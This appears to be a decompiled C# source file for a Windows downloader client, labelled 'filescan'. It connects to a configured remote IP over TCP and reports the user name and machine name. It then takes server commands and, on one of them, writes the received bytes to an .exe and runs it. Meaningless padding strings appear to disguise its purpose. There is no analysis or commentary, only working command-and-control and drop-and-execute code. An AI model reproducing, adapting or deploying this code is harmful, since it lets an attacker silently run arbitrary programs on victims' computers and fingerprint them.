using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace filescan;

internal class lclient
{
	public NetworkStream sysStream;

	public string pckgnam = "56asasa*/\\fyyr:ds-sds|pckgnam a-+a+d+a++[+]ds+@\\";

	private bool checking = false;

	public TcpClient sysSCK;

	public Form1 tParent;

	private int bytRead = 0;

	private string prefix = "pckgnam-|pckgnam".Split(new char[1] { '|' })[0];

	public System.Timers.Timer Timer = new System.Timers.Timer();

	public int bufSize = 1024;

	public bool iswitch = true;

	public string commend
	{
		get
		{
			try
			{
				more_data(null, "doupdat= " + Environment.UserName + "   |   " + Environment.MachineName + "   |  WINDOWS   ");
				byte[] array = new byte[5];
				bytRead = sysStream.Read(array, 0, 5);
				int num = BitConverter.ToInt32(array, 0);
				byte[] array2 = new byte[num];
				int num2 = 0;
				for (int num3 = num; num3 > 0; num3 -= bytRead)
				{
					int count = ((num3 > bufSize) ? bufSize : num3);
					bytRead = sysStream.Read(array2, num2, count);
					num2 += bytRead;
				}
				return Encoding.UTF8.GetString(array2, 0, num).ToString();
			}
			catch
			{
				return null;
			}
		}
	}

	private byte[] haveData()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			bytRead = sysStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			for (int num3 = num2; num3 > 0; num3 -= bytRead)
			{
				int count = ((num3 > bufSize) ? bufSize : num3);
				bytRead = sysStream.Read(array2, num, count);
				num += bytRead;
			}
			return array2;
		}
		catch
		{
			return null;
		}
	}

	private void close()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		if (((Control)tParent).get_InvokeRequired())
		{
			((Control)tParent).Invoke((Delegate)new MethodInvoker(close));
		}
		else
		{
			((Form)tParent).Close();
		}
	}

	private bool more_data(byte[] data, string type)
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes2 = BitConverter.GetBytes(bytes.Length);
			byte[] array2 = new byte[num2 + bytes.Length + (num - 1) + 1];
			bytes2.CopyTo(array2, 0);
			bytes.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + bytes.Length);
				data.CopyTo(array2, 10 + bytes.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0)
			{
				int num5 = ((num4 > bufSize) ? bufSize : num4);
				sysStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public bool _connetc()
	{
		try
		{
			IPAddress address = IPAddress.Parse(Encoding.UTF8.GetString(setting.ips, 0, setting.ips.Length));
			sysSCK = new TcpClient();
			sysSCK.Connect(new IPEndPoint(address, setting.sysPort));
			bufSize = sysSCK.ReceiveBufferSize;
			sysStream = sysSCK.GetStream();
			return true;
		}
		catch
		{
			return false;
		}
	}

	public void download_app()
	{
		try
		{
			if (!Directory.Exists(setting.mpath))
			{
				Directory.CreateDirectory(setting.mpath);
			}
			byte[] array = haveData();
			if (array != null)
			{
				File.WriteAllBytes(setting.mpath + setting.mainApp + ".exe", array);
				Thread.Sleep(100);
				Process process = new Process();
				process.StartInfo.FileName = setting.mpath + setting.mainApp + ".exe";
				process.Start();
			}
		}
		catch
		{
		}
	}

	public void responce()
	{
		try
		{
			iswitch = true;
			string text = commend;
			if (text == null)
			{
				iswitch = false;
			}
			string[] array = null;
			string[] array2 = text.Split(new char[1] { '=' });
			string text2 = array2[0].ToLower();
			if (text2.Split(new char[1] { '-' }).Length > 1)
			{
				text2 = text2.Split(new char[1] { '-' })[1];
			}
			switch ("pre-" + text2)
			{
			case "pre-upmain":
				array = array2[1].Split(new char[1] { '|' });
				if (array.Length == 2)
				{
					setting.mainApp = array[0];
					setting.appPath = array[1];
					setting.App = true;
				}
				break;
			case "pre-upsecs":
				array = array2[1].Split(new char[1] { '|' });
				if (array.Length == 2)
				{
					setting.secApp = array[0];
					setting.secPath = array[1];
					setting.securty = true;
				}
				break;
			case "pre-updatc":
				download_app();
				break;
			case "pre-info":
				responce();
				break;
			}
			iswitch = false;
		}
		catch
		{
			iswitch = false;
		}
	}

	public void check_upi()
	{
		try
		{
			if (!checking)
			{
				checking = true;
				if (!File.Exists(setting.mpath + setting.mainApp + ".exe") && _connetc())
				{
					responce();
				}
				else
				{
					close();
				}
				checking = false;
			}
		}
		catch
		{
			checking = false;
		}
	}
}
